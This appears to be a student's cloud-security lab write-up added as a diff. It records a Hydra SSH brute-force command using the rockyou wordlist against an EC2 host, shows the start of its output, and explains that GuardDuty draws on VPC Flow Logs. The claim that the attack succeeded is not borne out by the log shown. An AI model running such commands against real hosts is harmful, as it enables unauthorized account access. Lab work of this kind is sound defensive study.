@@ -1,0 +1,18 @@
+# Describe GuardDuty findings that were detected related to the brute force attack
+The GuardDuty didn't detect related to the bruce force attack, but I can prove that the attack was successfully executed.
+===============================================================================
+ubuntu@ip-10-192-11-51:~$ hydra -l ubuntu -P rockyou.txt ssh://ec2-18-205-121-84.compute-1.amazonaws.com
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2023-08-19 09:55:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[DATA] attacking ssh://ec2-18-205-121-84.compute-1.amazonaws.com:22/
+[STATUS] 263.00 tries/min, 263 tries in 00:01h, 14344144 to do in 909:01h, 16 active
+
+===============================================================================
+
+
+# Research the AWS Guard Duty documentation page and explain how GuardDuty may have detected this attack - i.e. what was its source of information.
+GuardDuty analyses and processes data from AWS CloudTrail event logs, VPC Flow Logs, and DNS logs.
+In this case, it should use the VPC Flow Logs.
